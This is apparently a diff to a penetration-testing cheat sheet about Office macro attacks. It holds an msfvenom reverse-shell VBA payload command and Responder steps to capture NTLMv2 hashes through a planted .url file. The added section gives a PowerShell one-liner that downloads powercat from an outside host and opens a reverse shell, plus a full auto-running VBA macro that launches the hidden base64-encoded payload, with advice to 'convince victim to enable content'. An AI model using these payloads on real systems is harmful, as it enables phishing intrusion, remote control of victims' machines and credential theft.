@@ -6,7 +6,7 @@
 ### office word macro development(vba script)
 ```
 1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f vba -o evil
-2. open word document and edit macro, copy paste then save as doc,docm,docx
+2. open word document and edit macro, copy paste then save as doc,docm
 3. open a listener
 ```
 
@@ -75,4 +75,41 @@ IconIndex=1
 2. if SMB share has write permission, upload @hax.url onto smb share
 3. sudo responder -I tun0 -Av
 Then you get ntlmv2 hash
+```
+### Office Macro Using Powershell base64 encoded reverse shell
+1. Original Powershell Payload
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:8000/powercat.ps1');powercat -c 192.168.45.181 -p 4444 -e powershell
+```
+2.![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/1d716a30-3a3b-423a-bc1e-c0c3c346240e)
+3. Using python to split and concatenate
+```
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+n = 50
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+4. Copy Macro script and convince victim to enable content
+```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
 ```
